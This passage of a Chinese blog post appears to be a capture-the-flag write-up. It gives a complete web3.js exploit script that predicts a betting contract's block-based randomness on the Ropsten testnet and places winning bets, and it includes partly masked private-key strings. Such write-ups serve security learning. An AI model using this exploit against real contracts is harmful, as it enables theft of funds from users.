class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;但实现了<code>solidity</code>在<code>web3js</code>中的运算迁移后，我们要实现使用<code>web3js</code>对合约进行交互和发送交易。两个月前我在一篇博客中简单说过调用合约的例子，当我拿过来用时发现以前的接口已经不能用了。。。同时会报一些错误，这也是耗费我时间的地方。</p><p>&emsp;&emsp;遇到的一个问题就是交易已经打包好（生成了txhash），但发送出去后在我的账号上却无法查看到。如果一直等着会报下面这个错误：</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error: Transaction was not mined within750 seconds, please make sure your transaction was properly sent. Be aware that it might still be mined!</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;旧的发送交易使用的是如下代码：</p><figure class="highlight js hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sendSigned_Old</span>(<span class="hljs-params">txData</span>) </span>&#123;</span><br><span class="line">    <span class="hljs-keyword">const</span> transaction = <span class="hljs-keyword">new</span> Tx(txData)</span><br><span class="line">    transaction.sign(privKey)</span><br><span class="line">    <span class="hljs-keyword">const</span> serializedTx = transaction.serialize().toString(<span class="hljs-string">'hex'</span>);</span><br><span class="line">    <span class="hljs-keyword">let</span> transact = web3.eth.sendSignedTransaction(<span class="hljs-string">'0x'</span> + serializedTx);</span><br><span class="line">    transact.on(<span class="hljs-string">'confirmation'</span>, (confirmationNumber, receipt) =&gt; &#123;</span><br><span class="line">        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">'confirmation'</span>, confirmationNumber);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    transact.on(<span class="hljs-string">'transactionHash'</span>, hash =&gt; &#123;</span><br><span class="line">        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">'hash'</span>, hash);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    transact.on(<span class="hljs-string">'receipt'</span>, receipt =&gt; &#123;</span><br><span class="line">        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">'reciept'</span>, receipt);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    transact.on(<span class="hljs-string">'error'</span>, <span class="hljs-built_in">console</span>.error);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;网上找了很多，这里提供下我的解决方案：</p><ul><li>更换<code>新的</code>的<code>sign</code>签名方法</li><li><code>nonce</code>注意要跟前面的不一样，新版本中可以<code>不用nonce</code>这个标志，web3js会自动帮你处理</li></ul><p>&emsp;&emsp;但有个问题很难避免，就是当你检测到<code>shark</code>跟你的<code>lucky</code>相等时立刻<code>下注</code>，但这个注的执行是这个块被矿工<code>挖出来</code>，并且状态是<code>Success</code>。但问题就出在从下注发送到下注被确认的<code>这段时间</code>内实际上是<code>非常有可能</code>产生新的块，从而导致<code>真正去调用合约</code>的时候<code>shark</code>值跟你计算的不一样，从而失败，其根本就是我们<code>无法控制</code>区块的产生。我这里的解决方案是<code>提高gas</code>，让矿工有更高的收益，从而优先打包我们的交易。但问题还是无法百分百解决。</p><p>&emsp;&emsp;这里也当记录下web3js的学习记录，完整的<code>exp</code>如下：</p><figure class="highlight js hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">let</span> Web3 = <span class="hljs-built_in">require</span>(<span class="hljs-string">"web3"</span>);</span><br><span class="line"><span class="hljs-keyword">let</span> Tx = <span class="hljs-built_in">require</span>(<span class="hljs-string">'ethereumjs-tx'</span>);</span><br><span class="line"><span class="hljs-keyword">const</span> BigNumber = <span class="hljs-built_in">require</span>(<span class="hljs-string">'bignumber.js'</span>);</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">let</span> privKey = <span class="hljs-keyword">new</span> Buffer.from(<span class="hljs-string">'1dc72fa....'</span>, <span class="hljs-string">'hex'</span>);</span><br><span class="line"><span class="hljs-keyword">let</span> fromAddress = <span class="hljs-string">"0x901B1...."</span>;</span><br><span class="line"><span class="hljs-comment">// 合约地址</span></span><br><span class="line"><span class="hljs-keyword">let</span> contractAddress = <span class="hljs-string">"0x804d8B0f43C57b5Ba940c1d1132d03f1da83631F"</span>;</span><br><span class="line"><span class="hljs-comment">// 创建web3对象</span></span><br><span class="line"><span class="hljs-keyword">let</span> web3 = <span class="hljs-keyword">new</span> Web3();</span><br><span class="line"><span class="hljs-comment">// 连接到 ropsten 测试节点</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">let</span> INFURA_API_KEY = <span class="hljs-string">"9762c...."</span></span><br><span class="line"><span class="hljs-keyword">let</span> ROPSTEN_URL = <span class="hljs-string">"https://ropsten.infura.io/"</span> + INFURA_API_KEY</span><br><span class="line">local = <span class="hljs-string">'http://192.168.142.145:8545'</span></span><br><span class="line">web3.setProvider(<span class="hljs-keyword">new</span> Web3.providers.HttpProvider(ROPSTEN_URL))</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">let</span> abi = [&#123;</span><br><span class="line">    <span class="hljs-string">"constant"</span>: <span class="hljs-literal">true</span>,</span><br><span class="line">    <span class="hljs-string">"inputs"</span>: [],</span><br><span class="line">    <span class="hljs-string">"name"</span>: <span class="hljs-string">"eosBlanceOf"</span>,</span><br><span class="line">    <span class="hljs-string">"outputs"</span>: [&#123;</span><br><span class="line">        <span class="hljs-string">"name"</span>: <span class="hljs-string">""</span>,</span><br><span class="line">        <span class="hljs-string">"type"</span>: <span class="hljs-string">"uint256"</span></span><br><span class="line">    &#125;],</span><br><span class="line">    <span class="hljs-string">"payable"</span>: <span class="hljs-literal">false</span>,</span><br><span class="line">    <span class="hljs-string">"stateMutability"</span>: <span class="hljs-string">"view"</span>,</span><br><span class="line">    <span class="hljs-string">"type"</span>: <span class="hljs-string">"function"</span></span><br><span class="line">&#125;, &#123;</span><br><span class="line">    <span class="hljs-string">"constant"</span>: <span class="hljs-literal">false</span>,</span><br><span class="line">    <span class="hljs-string">"inputs"</span>: [],</span><br><span class="line">    <span class="hljs-string">"name"</span>: <span class="hljs-string">"bigBlind"</span>,</span><br><span class="line">    <span class="hljs-string">"outputs"</span>: [],</span><br><span class="line">    <span class="hljs-string">"payable"</span>: <span class="hljs-literal">false</span>,</span><br><span class="line">    <span class="hljs-string">"stateMutability"</span>: <span class="hljs-string">"nonpayable"</span>,</span><br><span class="line">    <span class="hljs-string">"type"</span>: <span class="hljs-string">"function"</span></span><br><span class="line">&#125;, &#123;</span><br><span class="line">    <span class="hljs-string">"constant"</span>: <span class="hljs-literal">false</span>,</span><br><span class="line">    <span class="hljs-string">"inputs"</span>: [&#123;</span><br><span class="line">        <span class="hljs-string">"name"</span>: <span class="hljs-string">"b64email"</span>,</span><br><span class="line">        <span class="hljs-string">"type"</span>: <span class="hljs-string">"string"</span></span><br><span class="line">    &#125;],</span><br><span class="line">    <span class="hljs-string">"name"</span>: <span class="hljs-string">"CaptureTheFlag"</span>,</span><br><span class="line">    <span class="hljs-string">"outputs"</span>: [],</span><br><span class="line">    <span class="hljs-string">"payable"</span>: <span class="hljs-literal">false</span>,</span><br><span class="line">    <span class="hljs-string">"stateMutability"</span>: <span class="hljs-string">"nonpayable"</span>,</span><br><span class="line">    <span class="hljs-string">"type"</span>: <span class="hljs-string">"function"</span></span><br><span class="line">&#125;, &#123;</span><br><span class="line">    <span class="hljs-string">"constant"</span>: <span class="hljs-literal">false</span>,</span><br><span class="line">    <span class="hljs-string">"inputs"</span>: [],</span><br><span class="line">    <span class="hljs-string">"name"</span>: <span class="hljs-string">"initFund"</span>,</span><br><span class="line">    <span class="hljs-string">"outputs"</span>: [],</span><br><span class="line">    <span class="hljs-string">"payable"</span>: <span class="hljs-literal">false</span>,</span><br><span class="line">    <span class="hljs-string">"stateMutability"</span>: <span class="hljs-string">"nonpayable"</span>,</span><br><span class="line">    <span class="hljs-string">"type"</span>: <span class="hljs-string">"function"</span></span><br><span class="line">&#125;, &#123;</span><br><span class="line">    <span class="hljs-string">"constant"</span>: <span class="hljs-literal">false</span>,</span><br><span class="line">    <span class="hljs-string">"inputs"</span>: [],</span><br><span class="line">    <span class="hljs-string">"name"</span>: <span class="hljs-string">"smallBlind"</span>,</span><br><span class="line">    <span class="hljs-string">"outputs"</span>: [],</span><br><span class="line">    <span class="hljs-string">"payable"</span>: <span class="hljs-literal">false</span>,</span><br><span class="line">    <span class="hljs-string">"stateMutability"</span>: <span class="hljs-string">"nonpayable"</span>,</span><br><span class="line">    <span class="hljs-string">"type"</span>: <span class="hljs-string">"function"</span></span><br><span class="line">&#125;, &#123;</span><br><span class="line">    <span class="hljs-string">"constant"</span>: <span class="hljs-literal">true</span>,</span><br><span class="line">    <span class="hljs-string">"inputs"</span>: [&#123;</span><br><span class="line">        <span class="hljs-string">"name"</span>: <span class="hljs-string">""</span>,</span><br><span class="line">        <span class="hljs-string">"type"</span>: <span class="hljs-string">"address"</span></span><br><span class="line">    &#125;],</span><br><span class="line">    <span class="hljs-string">"name"</span>: <span class="hljs-string">"bet_count"</span>,</span><br><span class="line">    <span class="hljs-string">"outputs"</span>: [&#123;</span><br><span class="line">        <span class="hljs-string">"name"</span>: <span class="hljs-string">""</span>,</span><br><span class="line">        <span class="hljs-string">"type"</span>: <span class="hljs-string">"uint256"</span></span><br><span class="line">    &#125;],</span><br><span class="line">    <span class="hljs-string">"payable"</span>: <span class="hljs-literal">false</span>,</span><br><span class="line">    <span class="hljs-string">"stateMutability"</span>: <span class="hljs-string">"view"</span>,</span><br><span class="line">    <span class="hljs-string">"type"</span>: <span class="hljs-string">"function"</span></span><br><span class="line">&#125;, &#123;</span><br><span class="line">    <span class="hljs-string">"inputs"</span>: [],</span><br><span class="line">    <span class="hljs-string">"payable"</span>: <span class="hljs-literal">false</span>,</span><br><span class="line">    <span class="hljs-string">"stateMutability"</span>: <span class="hljs-string">"nonpayable"</span>,</span><br><span class="line">    <span class="hljs-string">"type"</span>: <span class="hljs-string">"constructor"</span></span><br><span class="line">&#125;, &#123;</span><br><span class="line">    <span class="hljs-string">"anonymous"</span>: <span class="hljs-literal">false</span>,</span><br><span class="line">    <span class="hljs-string">"inputs"</span>: [&#123;</span><br><span class="line">        <span class="hljs-string">"indexed"</span>: <span class="hljs-literal">false</span>,</span><br><span class="line">        <span class="hljs-string">"name"</span>: <span class="hljs-string">"b64email"</span>,</span><br><span class="line">        <span class="hljs-string">"type"</span>: <span class="hljs-string">"string"</span></span><br><span class="line">    &#125;, &#123;</span><br><span class="line">        <span class="hljs-string">"indexed"</span>: <span class="hljs-literal">false</span>,</span><br><span class="line">        <span class="hljs-string">"name"</span>: <span class="hljs-string">"slogan"</span>,</span><br><span class="line">        <span class="hljs-string">"type"</span>: <span class="hljs-string">"string"</span></span><br><span class="line">    &#125;],</span><br><span class="line">    <span class="hljs-string">"name"</span>: <span class="hljs-string">"FLAG"</span>,</span><br><span class="line">    <span class="hljs-string">"type"</span>: <span class="hljs-string">"event"</span></span><br><span class="line">&#125;]</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sendSigned_Old</span>(<span class="hljs-params">txData</span>) </span>&#123;</span><br><span class="line">    <span class="hljs-comment">// give up</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sendSigned</span>(<span class="hljs-params">txData</span>) </span>&#123;</span><br><span class="line">    web3.eth.accounts.signTransaction(txData, <span class="hljs-string">'0x1dc72fa8....'</span>)</span><br><span class="line">        .then(<span class="hljs-function"><span class="hljs-params">RLPencodedTx</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="hljs-keyword">let</span> transact = web3.eth.sendSignedTransaction(RLPencodedTx[<span class="hljs-string">'rawTransaction'</span>]);</span><br><span class="line">            transact.on(<span class="hljs-string">'confirmation'</span>, (confirmationNumber, receipt) =&gt; &#123;</span><br><span class="line">                <span class="hljs-built_in">console</span>.log(<span class="hljs-string">'confirmation'</span>, confirmationNumber);</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">            transact.on(<span class="hljs-string">'transactionHash'</span>, hash =&gt; &#123;</span><br><span class="line">                <span class="hljs-built_in">console</span>.log(<span class="hljs-string">'hash'</span>, hash);</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">            transact.on(<span class="hljs-string">'receipt'</span>, receipt =&gt; &#123;</span><br><span class="line">                <span class="hljs-built_in">console</span>.log(<span class="hljs-string">'reciept'</span>, receipt);</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">            transact.on(<span class="hljs-string">'error'</span>, <span class="hljs-built_in">console</span>.error);</span><br><span class="line"></span><br><span class="line">            setTimeout(<span class="hljs-function"><span class="hljs-params">nonce</span> =&gt;</span> &#123;</span><br><span class="line">                process.exit()</span><br><span class="line">            &#125;, <span class="hljs-number">1000</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">let</span> txData = &#123;</span><br><span class="line">    chainId: <span class="hljs-number">3</span>,</span><br><span class="line">    gas: web3.utils.toHex(<span class="hljs-number">2500000</span>),</span><br><span class="line">    gasLimit: web3.utils.toHex(<span class="hljs-number">2500000</span>),</span><br><span class="line">    gasPrice: web3.utils.toHex(<span class="hljs-number">40</span>*<span class="hljs-number">1e10</span>), <span class="hljs-comment">// 10 Gwei</span></span><br><span class="line">    to: contractAddress,</span><br><span class="line">    <span class="hljs-keyword">from</span>: fromAddress,</span><br><span class="line">    value: <span class="hljs-string">"0x0"</span>, <span class="hljs-comment">//web3.utils.toHex(web3.utils.toWei(0, 'wei')),</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">let</span> EOSGameContract = <span class="hljs-keyword">new</span> web3.eth.Contract(abi, contractAddress);</span><br><span class="line"><span class="hljs-keyword">let</span> MOD_NUM = <span class="hljs-number">20</span>;</span><br><span class="line"><span class="hljs-keyword">let</span> initfund = EOSGameContract.methods.initFund().encodeABI();</span><br><span class="line"><span class="hljs-keyword">let</span> smallblind = EOSGameContract.methods.smallBlind().encodeABI();</span><br><span class="line"><span class="hljs-keyword">let</span> bigblind = EOSGameContract.methods.bigBlind().encodeABI();</span><br><span class="line"><span class="hljs-keyword">let</span> ctf = EOSGameContract.methods.CaptureTheFlag(<span class="hljs-string">'amF5ODBAcHJvdG9ubWFpbC5jb20='</span>).encodeABI();</span><br><span class="line"><span class="hljs-comment">// console.log("initFund: " + initfund);</span></span><br><span class="line"><span class="hljs-comment">// console.log("smallBlind: " + smallblind);</span></span><br><span class="line"><span class="hljs-comment">// console.log("bigBlind: " + bigblind);</span></span><br><span class="line"><span class="hljs-comment">// console.log("CaptureTheFlag: " + ctf);</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">/*</span></span><br><span class="line"><span class="hljs-comment"> *   @ abi.encodePacked(number)  ---&gt;  web3.eth.abi.encodeParameter('uint256', number)</span></span><br><span class="line"><span class="hljs-comment"> */</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getshark</span>(<span class="hljs-params"></span>) </span>&#123;</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">        web3.eth.getBlock(<span class="hljs-string">'latest'</span>).then(<span class="hljs-function"><span class="hljs-params">results</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">'results.number: '</span> + results.number);</span><br><span class="line">            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">'results.timestamp: '</span> + results.timestamp);</span><br><span class="line">            <span class="hljs-keyword">let</span> number = results.number;</span><br><span class="line">            <span class="hljs-keyword">let</span> timestamp = results.timestamp;</span><br><span class="line">            <span class="hljs-keyword">let</span> temp = web3.eth.abi.encodeParameter(<span class="hljs-string">'uint256'</span>, number);</span><br><span class="line">            <span class="hljs-keyword">let</span> temp2 = web3.eth.abi.encodeParameter(<span class="hljs-string">'uint256'</span>, timestamp);</span><br><span class="line"></span><br><span class="line">            <span class="hljs-keyword">let</span> encry1 = web3.utils.keccak256(temp);</span><br><span class="line">            <span class="hljs-keyword">let</span> encry2 = web3.utils.keccak256(temp2);</span><br><span class="line">            <span class="hljs-keyword">let</span> uint256 = <span class="hljs-keyword">new</span> BigNumber(<span class="hljs-string">'115792089237316195423570985008687907853269984665640564039457584007913129639936'</span>);</span><br><span class="line">            <span class="hljs-keyword">let</span> number1 = <span class="hljs-keyword">new</span> BigNumber(web3.eth.abi.encodeParameter(<span class="hljs-string">'uint256'</span>, encry1));</span><br><span class="line">            <span class="hljs-keyword">let</span> number2 = <span class="hljs-keyword">new</span> BigNumber(web3.eth.abi.encodeParameter(<span class="hljs-string">'uint256'</span>, encry2));</span><br><span class="line">            <span class="hljs-comment">// console.log("number1: ", number1.toFormat().replace(/,/g, ''));</span></span><br><span class="line">            <span class="hljs-comment">// console.log("number2 ", number2.toFormat().replace(/,/g, ''));</span></span><br><span class="line"></span><br><span class="line">            <span class="hljs-keyword">let</span> result = number1.plus(number2);</span><br><span class="line">            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">"result: "</span>, result.toFormat().replace(<span class="hljs-regexp">/,/g</span>, <span class="hljs-string">''</span>));</span><br><span class="line"></span><br><span class="line">            <span class="hljs-keyword">if</span> (result.gt(uint256)) &#123;</span><br><span class="line">                result = result.minus(uint256).toFormat().replace(<span class="hljs-regexp">/,/g</span>, <span class="hljs-string">''</span>);</span><br><span class="line">                <span class="hljs-built_in">console</span>.log(<span class="hljs-string">"overflow update result: "</span>, result);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="hljs-keyword">let</span> seed = web3.eth.abi.encodeParameter(<span class="hljs-string">'uint256'</span>, result);</span><br><span class="line">            <span class="hljs-keyword">let</span> seed_hash = web3.utils.keccak256(seed);</span><br><span class="line">            seed_hash = <span class="hljs-keyword">new</span> BigNumber(web3.eth.abi.encodeParameter(<span class="hljs-string">'uint256'</span>, seed_hash));</span><br><span class="line">            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">"seed_hash: "</span>, seed_hash.toFormat().replace(<span class="hljs-regexp">/,/g</span>, <span class="hljs-string">''</span>));</span><br><span class="line"></span><br><span class="line">            <span class="hljs-keyword">let</span> shark = seed_hash.modulo(MOD_NUM).toFormat().replace(<span class="hljs-regexp">/,/g</span>, <span class="hljs-string">''</span>);</span><br><span class="line">            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">"shark: "</span>, shark);</span><br><span class="line"></span><br><span class="line">            resolve(shark);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getlucky_hash</span>(<span class="hljs-params"></span>) </span>&#123;</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">        EOSGameContract.methods.bet_count(fromAddress).call(&#123;</span><br><span class="line">            <span class="hljs-keyword">from</span>: fromAddress</span><br><span class="line">        &#125;, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">err, result</span>) </span>&#123;</span><br><span class="line">            <span class="hljs-keyword">if</span> (err) &#123;</span><br><span class="line">                <span class="hljs-keyword">throw</span> err;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">"bet_count result: "</span> + result);</span><br><span class="line">            <span class="hljs-keyword">let</span> getabi = web3.eth.abi.encodeParameter(<span class="hljs-string">'uint256'</span>, result);</span><br><span class="line">            <span class="hljs-keyword">let</span> encry = web3.utils.keccak256(getabi);</span><br><span class="line">            <span class="hljs-keyword">let</span> lucky = <span class="hljs-keyword">new</span> BigNumber(web3.eth.abi.encodeParameter(<span class="hljs-string">'uint256'</span>, encry));</span><br><span class="line">            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">"lucky: "</span>, lucky.toFormat().replace(<span class="hljs-regexp">/,/g</span>, <span class="hljs-string">''</span>));</span><br><span class="line"></span><br><span class="line">            <span class="hljs-keyword">let</span> lhash = lucky.modulo(MOD_NUM).toFormat().replace(<span class="hljs-regexp">/,/g</span>, <span class="hljs-string">''</span>);</span><br><span class="line">            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">"lucky_hash: "</span>, lhash);</span><br><span class="line">            resolve(lhash);</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">EOSGameContract.methods.bet_count(fromAddress).call(&#123;</span><br><span class="line">    <span class="hljs-keyword">from</span>: fromAddress</span><br><span class="line">&#125;, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">err, result</span>) </span>&#123;</span><br><span class="line">    <span class="hljs-keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="hljs-keyword">throw</span> err;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">"bet_count result: "</span> + result)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">smallBlind</span>(<span class="hljs-params"></span>) </span>&#123;</span><br><span class="line">    web3.eth.getTransactionCount(fromAddress).then(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">lastCountOfTransaction</span>)</span>&#123;</span><br><span class="line">        <span class="hljs-keyword">let</span> temp = txData;</span><br><span class="line">        temp[<span class="hljs-string">'data'</span>] = smallblind;</span><br><span class="line">        temp[<span class="hljs-string">'nonce'</span>] = web3.utils.toHex(lastCountOfTransaction);</span><br><span class="line">        <span class="hljs-built_in">console</span>.log(temp);</span><br><span class="line">        sendSigned(temp);</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">bigBlind</span>(<span class="hljs-params"></span>) </span>&#123;</span><br><span class="line">    <span class="hljs-keyword">let</span> temp = txData;</span><br><span class="line">    temp[<span class="hljs-string">'data'</span>] = bigblind;</span><br><span class="line">    <span class="hljs-built_in">console</span>.log(temp);</span><br><span class="line">    sendSigned(temp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">let</span> listener = EOSGameContract.events.FLAG(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">error, event</span>) </span>&#123;</span><br><span class="line">    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">"recv event data: "</span>)</span><br><span class="line">    <span class="hljs-built_in">console</span>.log(event);</span><br><span 